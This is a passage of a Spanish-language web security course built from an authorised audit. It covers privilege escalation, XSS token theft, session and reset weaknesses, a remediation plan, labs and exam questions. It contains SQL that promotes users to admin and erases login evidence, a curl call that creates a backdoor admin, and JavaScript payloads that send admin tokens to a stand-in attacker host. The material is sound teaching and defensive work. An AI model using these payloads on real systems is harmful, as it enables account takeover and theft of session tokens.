    id          INT AUTO_INCREMENT PRIMARY KEY,
    user_id     INT NOT NULL,
    action      VARCHAR(50) NOT NULL,  -- 'DELETE_BOOKING', 'DELETE_USER', etc.
    target_type VARCHAR(50) NOT NULL,  -- 'booking', 'user', 'vehicle'
    target_id   INT NOT NULL,
    ip_address  VARCHAR(45),
    user_agent  VARCHAR(255),
    created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

---

# 8. Módulo E — Escalamiento de Privilegios: De Usuario a Administrador

## 8.1 Concepto Teórico

- **OWASP Top 10 — A01:2021 Broken Access Control**
- **CWE-269: Improper Privilege Management**

El **escalamiento de privilegios** ocurre cuando un usuario obtiene permisos superiores a los que le fueron asignados. Es una de las vulnerabilidades más críticas porque permite a un atacante tomar control completo del sistema.

### Tipos de Escalamiento

```
┌──────────────────────────────────────────────────────────────────┐
│            TIPOS DE ESCALAMIENTO DE PRIVILEGIOS                  │
│                                                                  │
│  HORIZONTAL                           VERTICAL                   │
│  ┌─────────────┐                     ┌─────────────┐            │
│  │ Usuario A   │──── accede a ─────▶ │ Datos de    │            │
│  │ (normal)    │                     │ Usuario B   │            │
│  └─────────────┘                     │ (normal)    │            │
│  Mismo nivel de privilegios          └─────────────┘            │
│                                                                  │
│  VERTICAL (lo que se encontró aquí)                              │
│  ┌─────────────┐                     ┌─────────────┐            │
│  │ Usuario     │──── escala a ─────▶ │ Administra- │            │
│  │ (normal)    │                     │ dor         │            │
│  └─────────────┘                     └─────────────┘            │
│  De un nivel a uno superior                                      │
└──────────────────────────────────────────────────────────────────┘
```

## 8.2 Vector 1 — Escalamiento Directo via Acceso a Base de Datos

Si un atacante obtiene las credenciales de la BD (ver Módulo B), puede escalar privilegios directamente:

```sql
-- ─── PASO 1: Reconocimiento — Estructura de la tabla users ────────────
DESCRIBE users;

-- Resultado (simplificado):
-- ┌─────────────────┬──────────────┐
-- │ Campo           │ Tipo         │
-- ├─────────────────┼──────────────┤
-- │ id              │ int(11)      │
-- │ name            │ varchar(100) │
-- │ email           │ varchar(100) │
-- │ password_hash   │ varchar(255) │  ← Contraseña hasheada con bcrypt
-- │ role            │ varchar(20)  │  ← 'user' o 'admin' — OBJETIVO
-- │ api_token       │ varchar(255) │  ← Token de sesión activo
-- │ token_expires_at│ datetime     │  ← Expiración del token
-- │ reset_token     │ varchar(255) │  ← Token de reset de contraseña
-- └─────────────────┴──────────────┘
```

```sql
-- ─── PASO 2: Opción A — Promover una cuenta existente ─────────────────
-- El atacante ya tiene una cuenta de usuario normal registrada
UPDATE users SET role = 'admin' WHERE email = 'mi_cuenta@ejemplo.com';
-- ¡Ahora esa cuenta tiene privilegios de administrador!

-- ─── PASO 2: Opción B — Crear un admin desde cero ────────────────────
-- El atacante genera un hash bcrypt para una contraseña que conoce:
-- php -r "echo password_hash('MiPassword!23', PASSWORD_DEFAULT);"

INSERT INTO users (name, email, password_hash, role, phone) VALUES (
    'Soporte Técnico',                        -- Nombre inocuo
    'soporte@dominio-que-parece-real.com',    -- Email controlado
    '$2y$10$hash_generado_previamente...',    -- Password conocido
    'admin',                                  -- ← Rol administrador
    '+573000000000'
);

-- ─── PASO 2: Opción C — Inyectar un token directamente ───────────────
-- No necesita ni hacer login: se auto-asigna un token válido
UPDATE users
SET api_token = 'token_personalizado_del_atacante',
    token_expires_at = '2030-12-31 23:59:59'  -- Token que no expira
WHERE email = 'mi_cuenta@ejemplo.com';
-- Ahora puede usar: Authorization: Bearer token_personalizado_del_atacante
```

```sql
-- ─── PASO 3: Cubrimiento de rastros ──────────────────────────────────
TRUNCATE TABLE login_attempts;  -- Eliminar evidencia de intentos
```

### ¿Por qué es tan peligroso?

| Característica | Impacto |
|---------------|---------|
| No deja rastro en logs de la aplicación | La app ve un login "normal" |
| El login es legítimo | No activa rate limiters |
| Sin notificaciones de nuevos admins | Nadie se entera |
| Operación sigilosa durante semanas | Exfiltración prolongada de datos |

## 8.3 Vector 2 — Endpoint de Creación de Admin sin Validación Completa

```php
// ─── HALLAZGO EN AUDITORÍA ────────────────────────────────────────────

// REGISTRO PÚBLICO: SÍ valida fortaleza de contraseña
// POST /auth/register
$pwdCheck = Auth::validatePasswordStrength($input['password']);
if ($pwdCheck !== true) {
    jsonResponse(['error' => $pwdCheck], 400);
}
// Exige: 8 caracteres, mayúscula, minúscula, número, carácter especial ✅

// CREACIÓN DE ADMIN: NO valida fortaleza de contraseña  ❌
// POST /admin/users
if ($method === 'POST' && $requestUri === '/admin/users') {
    requireAdmin();
    $input = getJsonInput();

    // Solo verifica que no estén vacíos — NO valida el password
    if (empty($input['email']) || empty($input['password']) || empty($input['name'])) {
        jsonResponse(['error' => 'Missing fields'], 400);
    }

    $userId = $userModel->create(
        $input['name'],
        $input['email'],
        $input['password'],
        $input['phone'] ?? '',
        'admin'               // ← SIEMPRE crea con rol 'admin', hardcoded
    );
    // ⚠️ No llama a Auth::validatePasswordStrength()
}
```

### Implicación Práctica

```bash
# Un atacante con acceso admin temporal puede crear backdoors persistentes:
curl -X POST https://ejemplo.com/api/admin/users \
     -H "Authorization: Bearer TOKEN_ADMIN" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "Soporte",
       "email": "backdoor@atacante.com",
       "password": "123"
     }'
# → ¡Admin creado con password "123"! Sin validación de fortaleza.
# Esta cuenta persiste como backdoor aunque el token original expire.
```

> **LECCIÓN CLAVE:** La validación de seguridad debe ser CONSISTENTE en TODOS los endpoints. No basta con validar en el registro público si el endpoint de admin no aplica las mismas reglas.

---

# 9. Módulo F — Ataques al Lado del Cliente: XSS y Robo de Tokens

## 9.1 Concepto Teórico

- **OWASP Top 10 — A03:2021 Injection (XSS es un tipo de injection)**
- **CWE-79: Cross-site Scripting (XSS)**

**Cross-Site Scripting (XSS)** ocurre cuando un atacante logra ejecutar JavaScript arbitrario en el navegador de otro usuario. En el contexto de esta aplicación, el objetivo es robar el **token de sesión** del administrador almacenado en `localStorage`.

## 9.2 Cadena de Ataque: XSS → Robo de Token → Escalamiento

```
┌──────────────────────────────────────────────────────────────────┐
│              CADENA DE ATAQUE XSS → ADMIN TAKEOVER               │
│                                                                  │
│  1. INYECTAR XSS                                                 │
│     ┌──────────────────────────────────────┐                     │
│     │ El atacante inyecta JavaScript       │                     │
│     │ malicioso en la aplicación via:      │                     │
│     │ • [innerHTML] no sanitizado          │                     │
│     │ • Dependencia npm comprometida       │                     │
│     │ • CDN externo hackeado               │                     │
│     └───────────────┬──────────────────────┘                     │
│                     │                                            │
│  2. ROBAR TOKEN     ▼                                            │
│     ┌──────────────────────────────────────┐                     │
│     │ El script extrae de localStorage:    │                     │
│     │ • token (Bearer para la API)         │                     │
│     │ • user (datos del usuario + rol)     │                     │
│     │ Solo roba tokens de admin            │                     │
│     └───────────────┬──────────────────────┘                     │
│                     │                                            │
│  3. EXFILTRAR       ▼                                            │
│     ┌──────────────────────────────────────┐                     │
│     │ Envía el token al servidor del       │                     │
│     │ atacante via:                        │                     │
│     │ • new Image().src (invisible)        │                     │
│     │ • navigator.sendBeacon()             │                     │
│     │ • fetch() a dominio controlado       │                     │
│     └───────────────┬──────────────────────┘                     │
│                     │                                            │
│  4. USAR TOKEN      ▼                                            │
│     ┌──────────────────────────────────────┐                     │
│     │ El atacante usa el token robado      │                     │
│     │ para:                                │                     │
│     │ • Crear su propio admin permanente   │                     │
│     │ • Exfiltrar datos del sistema        │                     │
│     │ • Ejecutar operaciones destructivas  │                     │
│     │ VENTANA: ~2 horas (vida del token)   │                     │
│     └──────────────────────────────────────┘                     │
└──────────────────────────────────────────────────────────────────┘
```

## 9.3 Vectores XSS Encontrados en la Auditoría

### a) Uso de `[innerHTML]` en componentes Angular

```typescript
// Hallazgos en código Angular:

// 1. step-progress.component.ts
<div [innerHTML]="lang.t(step.labelKey)"></div>
// Riesgo: BAJO — las traducciones son cadenas estáticas hardcoded

// 2. faq2.component.ts
<div [innerHTML]="selectedItem()?.answer"></div>
// Riesgo: MEDIO — si los FAQs se mueven a base de datos,
//         el contenido HTML podría ser manipulado
```

### b) Dependencia de CDNs Externos (Supply Chain Attack)

```html
<!-- Hallazgo en index.html de la aplicación auditada -->

<!-- CDN de framework CSS →→ riesgo de supply chain attack -->
<script src="https://cdn.framework-ejemplo.com/v3.js"></script>

<!-- Import maps de CDN externo →→ todo el código puede ser reemplazado -->
<script type="importmap">
{
  "imports": {
    "framework": "https://cdn-externo.com/framework.js"
  }
}
</script>
```

> ⚠️ **Supply Chain Attack:** Si el CDN externo es comprometido (hackean el servidor del CDN), todo script servido desde ahí se ejecutará en el contexto de TU dominio, con acceso completo a cookies, localStorage y DOM.

## 9.4 Ejemplo Educativo: Payload de Robo de Token

```javascript
// ─── PAYLOAD EDUCATIVO: Exfiltración de token via imagen (invisible) ──
// CONTEXTO: Este código se ejecutaría si un atacante logra inyectar XSS
// PROPÓSITO: Demostrar por qué localStorage NO es seguro para tokens

(function(){
    var token = localStorage.getItem('token');
    var userData = localStorage.getItem('user');

    if (token && userData) {
        var user = JSON.parse(userData);

        // Solo roba tokens de administradores (ataque dirigido)
        if (user.role === 'admin') {
            // Técnica: crear una imagen invisible que envía datos al atacante
            // El navegador hace una petición GET al cargar la "imagen"
            new Image().src = 'https://servidor-atacante.com/collect?t='
                + encodeURIComponent(token)
                + '&email=' + encodeURIComponent(user.email);
            // ↑ El token viaja como parámetro GET — completamente invisible
        }
    }
})();
```

```javascript
// ─── PAYLOAD 2: Verificación + exfiltración (más sofisticado) ─────────
(async function(){
    var t = localStorage.getItem('token');
    if (!t) return;

    // Verifica que el token realmente funciona antes de exfiltrarlo
    try {
        var r = await fetch('/server/public/admin/users', {
            headers: {'Authorization': 'Bearer ' + t}
        });
        if (r.status === 200) {
            // Token de admin confirmado — exfiltrar con datos
            navigator.sendBeacon(
                'https://servidor-atacante.com/collect',
                JSON.stringify({token: t, users: await r.json()})
            );
        }
    } catch(e) {}
})();
```

## 9.5 Mitigaciones

### a) Migrar tokens a cookies HttpOnly

```
┌──────────────────────────────────────────────────────────────────┐
│      localStorage vs Cookies HttpOnly para Tokens                │
│                                                                  │
│  localStorage:                                                   │
│  • Accesible via JavaScript: localStorage.getItem('token')       │
│  • ❌ XSS puede leer el token                                   │
│  • ❌ Supply chain attacks pueden exfiltrarlo                    │
│                                                                  │
│  Cookie HttpOnly:                                                │
│  • NO accesible via JavaScript (el navegador lo bloquea)         │
│  • ✅ XSS NO puede leer la cookie                               │
│  • ✅ Se envía automáticamente con cada petición HTTP            │
│  • ⚠️ Requiere protección CSRF adicional (SameSite=Strict)      │
│                                                                  │
│  // Servidor PHP — Establecer cookie segura:                     │
│  setcookie('session_token', $token, [                            │
│      'httponly'  => true,    // ← JS no puede leerla             │
│      'secure'   => true,    // ← Solo via HTTPS                 │
│      'samesite' => 'Strict', // ← Protección CSRF               │
│      'path'     => '/api',                                       │
│      'expires'  => time() + 7200  // 2 horas                    │
│  ]);                                                             │
└──────────────────────────────────────────────────────────────────┘
```

### b) Subresource Integrity (SRI)

```html
<!-- SIN SRI (vulnerable a CDN comprometido) -->
<script src="https://cdn.ejemplo.com/library.js"></script>

<!-- CON SRI (seguro — verifica integridad del archivo) -->
<script src="https://cdn.ejemplo.com/library.js"
        integrity="sha384-abc123def456..."
        crossorigin="anonymous"></script>

<!-- Si el CDN es hackeado y el contenido cambia, el hash no coincide
     y el navegador RECHAZA ejecutar el script -->
```

### c) Content Security Policy (CSP)

```html
<!-- Header que restringe qué scripts pueden ejecutarse -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline';
               img-src 'self' data:;
               connect-src 'self' https://api.tu-dominio.com;">

<!-- 'self' = solo scripts del mismo dominio
     Sin 'unsafe-inline' para scripts = bloquea XSS inline
     Sin 'unsafe-eval' = bloquea eval() malicioso -->
```

---

# 10. Módulo G — Debilidades en Gestión de Sesiones y Reset de Contraseñas

## 10.1 Análisis del Token de Sesión

```php
// ─── GENERACIÓN DEL TOKEN DE SESIÓN ───────────────────────────────────
// Archivo: Auth.php

public static function generateToken($length = 32)
{
    return bin2hex(random_bytes($length));
    // Genera: 64 caracteres hexadecimales
    // Espacio de búsqueda: 16^64 = 2^256 combinaciones
    // = 1.15 × 10^77 combinaciones posibles
}
```

### Evaluación de la Fortaleza del Token

```
┌──────────────────────────────────────────────────────────────────┐
│        ANÁLISIS CRIPTOGRÁFICO DEL TOKEN DE SESIÓN                │
│                                                                  │
│  Generador: random_bytes() → CSPRNG del sistema operativo        │
│  Longitud:  64 caracteres hexadecimales (256 bits de entropía)   │
│  Espacio:   2^256 = 1.15 × 10^77 combinaciones                  │
│                                                                  │
│  Ataque de fuerza bruta:                                         │
│  • A 1 billón de intentos/segundo (10^9)                         │
│  • Tiempo: 1.15 × 10^68 segundos ≈ 3.67 × 10^58 AÑOS           │
│  • Para contexto: el universo tiene ~1.37 × 10^10 años          │
│                                                                  │
│  ✅ VEREDICTO: Token criptográficamente SEGURO                   │
│  ✅ CSPRNG apropiado (no pseudo-random, sino crypto-random)      │
│                                                                  │
│  ⚠️ DEBILIDADES en la IMPLEMENTACIÓN (no en la criptografía):   │
│  • Sin binding a IP o User-Agent                                 │
│  • Sin rate limiting en verificación de tokens inválidos         │
│  • Sin invalidación masiva (no hay "cerrar todas las sesiones")  │
└──────────────────────────────────────────────────────────────────┘
```

## 10.2 Debilidades en el Flujo de Reset de Contraseña

```
┌──────────────────────────────────────────────────────────────────┐
│         FLUJO DE RESET DE CONTRASEÑA — ANÁLISIS                  │
│                                                                  │
│  1. POST /auth/forgot-password                                   │
│     • Recibe email del usuario                                   │
│     • Genera token de reset (32 chars hex)                       │
│     • Envía email con link de reset                              │
│     • ✅ Siempre responde éxito (anti-enumeración de emails)     │
│                                                                  │
│  2. POST /auth/reset-password                                    │
│     • Recibe token + nueva contraseña                            │
│     • Busca usuario por token en la BD                           │
│     • Actualiza la contraseña                                    │
│                                                                  │
│  ⚠️ DEBILIDADES ENCONTRADAS:                                    │
│                                                                  │
│  a) Expiración demasiado larga: 2 HORAS                         │
│     RECOMENDACIÓN: Reducir a 15-30 minutos                       │
│                                                                  │
│  b) Token no se invalida después de usarse                       │
│     RIESGO: Replay attack — reutilizar un token ya usado         │
│                                                                  │
│  c) Sin notificación al usuario de cambio de contraseña          │
│     RIESGO: El usuario no sabe que su password fue cambiado      │
│                                                                  │
│  d) Sin invalidar sesiones activas al cambiar password           │
│     RIESGO: El atacante cambia password pero el admin sigue      │
│             logueado con el viejo token — ambigüedad de estado   │
└──────────────────────────────────────────────────────────────────┘
```

## 10.3 Archivo de Log de Depuración Expuesto

```php
// ─── HALLAZGO CRÍTICO ─────────────────────────────────────────────────
// El servidor escribe información de debug en un archivo de texto plano
// que PODRÍA ser accesible via HTTP

// index.php — Ejemplo de lo que se loguea:
logDebug("Register attempt: " . json_encode($input));
// ↑ LOGUEA CONTRASEÑAS EN TEXTO PLANO de cada intento de registro
```

```bash
# ─── VECTOR DE ATAQUE ─────────────────────────────────────────────────
# El atacante verifica si el log es accesible por HTTP:
curl -s https://ejemplo.com/debug_log.txt

# Si retorna HTTP 200 con contenido:
# [2026-04-15 10:30:00] Register attempt: {
#   "name": "Admin",
#   "email": "admin@ejemplo.com",
#   "password": "ContraseñaDelAdmin!"   ← ¡EN TEXTO PLANO!
# }

# PASO 2: El atacante usa esas credenciales para hacer login
# RESULTADO: Acceso admin completo sin ningún exploit técnico
```

### Correcciones para Logs

```
1. ❌ NUNCA loguear contraseñas — loguear solo email y resultado
   logDebug("Register: " . $input['email'] . " → " . $resultado);

2. 📁 Mover log FUERA del directorio público web
   Ruta segura: /var/log/app/ en lugar de /public_html/

3. 🔒 Bloquear acceso via .htaccess (defensa en profundidad):
   <Files "debug_log.txt">
       Order deny,allow
       Deny from all
   </Files>

4. 🔄 Implementar rotación de logs (borrar logs > 7 días)

5. 📡 Considerar servicio de logging externo (CloudWatch, Papertrail)
```

---

# 11. Módulo H — Plan de Remediación y Hardening

## 11.1 Resumen de Vulnerabilidades Encontradas

| ID | Vulnerabilidad | Severidad | OWASP | Explotable Hoy |
|----|---------------|-----------|-------|-----------------|
| A1 | SQL Injection en Booking.php | 🔴 Crítico (diseño) | A03 | ⚠️ Parcial (3 barreras) |
| A2 | Credenciales en código fuente | 🔴 Crítico | A07 | ✅ Sí |
| A3 | Endpoint DDL via HTTP | 🟠 Alto | A04 | ⚠️ Con token admin |
| A4 | DELETE masivo sin protección | 🟠 Alto | A04 | ⚠️ Con token admin |
| B1 | Escalamiento via BD | 🔴 Crítico | A01 | ✅ Con credenciales BD |
| B2 | XSS → robo de token | 🟠 Alto | A03/A07 | ⚠️ Requiere vector XSS |
| B3 | Fuerza bruta de tokens | 🟢 Bajo | A07 | ❌ Criptográficamente seguro |
| B4 | Log con contraseñas | 🟠 Alto | A09 | ✅ Si log accesible |
| B5 | Reset token largo (2h) | 🟡 Medio | A07 | ⚠️ Requiere acceso email |
| B6 | Admin sin validar password | 🟡 Medio | A07 | ⚠️ Con token admin |

## 11.2 Plan de Remediación Priorizado

### 🚨 Prioridad CRÍTICA — Implementar esta semana

| # | Acción | Esfuerzo | Impacto |
|---|--------|----------|---------|
| 1 | **Rotar contraseña de BD** y mover a `.env` | 30 min | Neutraliza 60% de vectores |
| 2 | **Eliminar archivo de test** que da ejecución remota | 2 min | Cierra backdoor potencial |
| 3 | **Bloquear acceso a logs** via `.htaccess` | 2 min | Evita leak de passwords |
| 4 | **No loguear contraseñas** | 1 min | Elimina exposición pasiva |
| 5 | **Corregir SQL injection** con prepared statements | 2 min | Defensa en profundidad |
| 6 | **Ocultar stack traces** en producción | 5 min | Evita information disclosure |
| 7 | **Restringir CORS** a dominios conocidos | 10 min | Reduce superficie de ataque |

### 🟠 Prioridad ALTA — Implementar en 1-2 semanas

| # | Acción | Esfuerzo |
|---|--------|----------|
| 8 | Validar password al crear admin | 5 min |
| 9 | Rate limiting en endpoints DELETE | 2 horas |
| 10 | Notificar creación de nuevos admins | 2 horas |
| 11 | Implementar audit log | 4 horas |
| 12 | Reducir expiración de reset token | 5 min |
| 13 | Invalidar sesiones al cambiar password | 30 min |

### 🟡 Prioridad MEDIA — Implementar en 2-4 semanas

| # | Acción | Esfuerzo |
|---|--------|----------|
| 14 | Migrar tokens a cookies HttpOnly | 8 horas |
| 15 | Eliminar CDNs externos, usar build local | 2 horas |
| 16 | Implementar soft delete | 6 horas |
| 17 | Re-autenticación para operaciones destructivas | 4 horas |
| 18 | Content Security Policy sin unsafe-inline | 4 horas |
| 19 | Backups automáticos de BD | 2 horas |

## 11.3 Diagrama Completo de Relaciones entre Vectores de Ataque

```
┌──────────────────────────────────────────────────────────────────────┐
│                 MAPA DE CADENAS DE ATAQUE                            │
│                                                                      │
│   PUNTO DE ENTRADA PRINCIPAL                                         │
│   ┌───────────────────────┐                                          │
│   │ Credenciales de BD    │                                          │
│   │ en código fuente      │                                          │
│   │ (config.php)          │                                          │
│   └──────────┬────────────┘                                          │
│              │                                                       │
│              │ Da acceso directo a MySQL                              │
│              ▼                                                       │
│   ┌──────────────────────┐    ┌─────────────────────────────┐        │
│   │ ESCALAR A ADMIN      │    │ DESTRUIR BASE DE DATOS      │        │
│   │ UPDATE role='admin'  │    │ DROP TABLE / DELETE masivo   │        │
│   │ o INSERT nuevo admin │    │                             │        │
│   └──────────┬───────────┘    └─────────────────────────────┘        │
│              │                                                       │
│              │ Con token admin                                       │
│              ▼                                                       │
│   ┌──────────────────────┐    ┌─────────────────────────────┐        │
│   │ BORRADO MASIVO       │    │ CREAR BACKDOOR ADMIN        │        │
│   │ via endpoints DELETE │    │ con password débil "123"    │        │
│   │ (sin rate limiting)  │    │ (sin validación)            │        │
│   └──────────────────────┘    └─────────────────────────────┘        │
│                                                                      │
│   VECTORES INDEPENDIENTES:                                           │
│   ┌────────────────┐  ┌────────────────┐  ┌────────────────┐        │
│   │ XSS + robo de  │  │ Log expuesto   │  │ Reset token    │        │
│   │ token de admin │  │ con passwords  │  │ demasiado      │        │
│   │ (localStorage) │  │ en texto plano │  │ largo (2h)     │        │
│   └────────────────┘  └────────────────┘  └────────────────┘        │
│                                                                      │
│   ════════════════════════════════════════════════════════════        │
│   CONCLUSIÓN: Cerrar las credenciales en config.php                  │
│   NEUTRALIZA el 60% de los vectores de ataque identificados.         │
│   ════════════════════════════════════════════════════════════        │
└──────────────────────────────────────────────────────────────────────┘
```

---

# 12. Laboratorios Prácticos

> ⚠️ **IMPORTANTE:** Todos los laboratorios deben realizarse en **entornos controlados** (máquinas virtuales, Docker, labs online). **NUNCA** practiques contra sistemas en producción o de terceros sin autorización escrita.

## Lab 1 — SQL Injection con DVWA

**Objetivo:** Practicar SQL injection en un entorno seguro

```bash
# Configurar lab (Docker):
docker pull vulnerables/web-dvwa
docker run -d -p 8080:80 vulnerables/web-dvwa

# Acceder a: http://localhost:8080
# Credenciales por defecto: admin / password
```

**Ejercicios:**
1. Identificar campos vulnerables a SQL injection
2. Extraer la lista de usuarios con UNION-based injection
3. Usar `sqlmap` para automatizar la detección
4. Aplicar la corrección (prepared statements) y verificar que ya no funciona

## Lab 2 — Análisis de Código Estático (SAST)

**Objetivo:** Aprender a detectar vulnerabilidades mirando solo el código

```bash
# Herramientas recomendadas:
# PHP: phpstan, psalm
composer require --dev phpstan/phpstan
./vendor/bin/phpstan analyse src/

# JavaScript: eslint-plugin-security
npm install --save-dev eslint-plugin-security

# Multi-lenguaje: semgrep (gratuito y open source)
pip install semgrep
semgrep --config auto ./
```

**Ejercicio:** Dado un archivo PHP con 5 vulnerabilidades intencionales, identifica:
- ¿Cuáles son explotables?
- ¿Qué barreras existen?
- ¿Cómo se corrige cada una?

## Lab 3 — Detección de Secretos en Repositorios

**Objetivo:** Practicar detección de credenciales expuestas en Git

```bash
# Crear repositorio de prueba con secretos intencionales:
mkdir lab-secrets && cd lab-secrets
git init

# Crear archivos con secretos (ficticios):
echo 'DB_PASSWORD=SuperSecreto123' > config.php
git add . && git commit -m "initial"

# Ahora "corregir" (pero el secreto sigue en el historial):
echo 'DB_PASSWORD=getenv("DB_PASS")' > config.php
git add . && git commit -m "fix: use env vars"

# Escanear con herramientas:
trufflehog git file://./
gitleaks detect --source .

# ¿El secreto fue encontrado a pesar de haber sido "eliminado"? ¡Sí!
```

## Lab 4 — XSS y Robo de Tokens

**Objetivo:** Entender XSS y localStorage como vector de ataque

```bash
# Usar OWASP Juice Shop:
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
# Acceder a: http://localhost:3000
```

**Ejercicios:**
1. Encontrar un campo vulnerable a XSS
2. Inyectar un script que lea `localStorage`
3. Implementar la mitigación (cookies HttpOnly + CSP)

---

# 13. Evaluación Final

## Preguntas Teóricas

1. **Explica** por qué un prepared statement previene SQL injection, usando tus propias palabras. Describe los dos pasos (compilación y ejecución) del proceso.

2. **Compara** las 3 barreras de defensa encontradas en el caso A1 (SQL Injection). ¿Cuál es la más robusta? ¿Cuál es la más frágil? ¿Por qué?

3. **Argumenta** por qué las credenciales en `config.php` son más peligrosas que la SQL injection encontrada, a pesar de que SQL injection suena más "técnico".

4. **Diseña** un sistema de audit log para la API. ¿Qué campos incluirías en la tabla? ¿Cómo detectarías borrado masivo automatizado? ¿Qué alertas configurarías?

5. **Compara** `localStorage` vs cookies `HttpOnly` para almacenar tokens de sesión. ¿Cuáles son los trade-offs de cada enfoque? ¿Qué protección adicional necesitan las cookies?

6. **Analiza** el diagrama de cadenas de ataque (sección 11.3). ¿Por qué cerrar las credenciales en config.php neutraliza el 60% de los vectores? Traza las dependencias.

## Ejercicio Práctico

Dado el siguiente endpoint PHP, **identifica todas las vulnerabilidades** y proporciona el código corregido:

```php
// ¿Cuántas vulnerabilidades puedes encontrar?
if ($method === 'POST' && $requestUri === '/admin/execute') {
    $input = getJsonInput();
    $tableName = $input['table'];
    $conn->exec("DELETE FROM $tableName WHERE id = " . $input['id']);
    logDebug("Deleted from $tableName: " . json_encode($input));
    echo json_encode(['success' => true]);
}
```

**Pistas para el estudiante:** busca al menos **6 problemas de seguridad** en este código. Considera:
- ¿Quién puede acceder?
- ¿Se valida el input?
- ¿Qué tipo de datos se loguean?
- ¿Es permanente la operación?
- ¿Hay registro de quién hizo qué?
- ¿Qué tipo de injection puede ocurrir?

---

# 14. Recursos Adicionales

## Formación Gratuita
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Labs interactivos gratuitos
- [HackTheBox Academy](https://academy.hackthebox.com/) — Labs de pentesting
- [TryHackMe](https://tryhackme.com/) — Rutas de aprendizaje guiadas

## Herramientas Esenciales

| Herramienta | Uso | Tipo |
|-------------|-----|------|
| Burp Suite Community | Interceptar y modificar peticiones HTTP | Proxy |
| OWASP ZAP | Escáner de vulnerabilidades web (gratuito) | DAST |
| sqlmap | Automatizar detección/explotación de SQLi | CLI |
| Nmap | Escaneo de puertos y servicios | Recon |
| TruffleHog / GitLeaks | Detección de secretos en repos | SAST |
| Semgrep | Análisis estático multi-lenguaje | SAST |
| Metasploit | Framework de pentesting completo | Exploit |

## Certificaciones Recomendadas
- **CompTIA Security+** — Fundamentos de ciberseguridad
- **CEH (Certified Ethical Hacker)** — EC-Council
- **OSCP (Offensive Security Certified Professional)** — Prueba práctica de 24h
- **eJPT (eLearnSecurity Junior Penetration Tester)** — Nivel inicial accesible

## Referencias Normativas
- OWASP Top 10 (2021): https://owasp.org/Top10/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- PTES Standard: http://www.pentest-standard.org/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- Ley 1273 de 2009 (Colombia): Delitos Informáticos

---

> **Nota del Instructor:**  
> Este material fue creado a partir de una auditoría de seguridad real (white hacking / caja blanca) realizada sobre un sistema de producción con autorización del propietario. Todas las credenciales, URLs y datos identificables han sido redactados. Las vulnerabilidades documentadas son representativas de problemas comunes en aplicaciones web del mundo real.  
>  
> El objetivo es que los estudiantes comprendan que la **seguridad no es un estado, sino un proceso continuo** — y que incluso aplicaciones funcionales pueden tener vulnerabilidades críticas que, combinadas (cadenas de ataque), amplifican el impacto individual de cada una.
>
> **Recuerda siempre:** Con gran poder viene una gran responsabilidad. Usa este conocimiento para **proteger**, no para dañar.
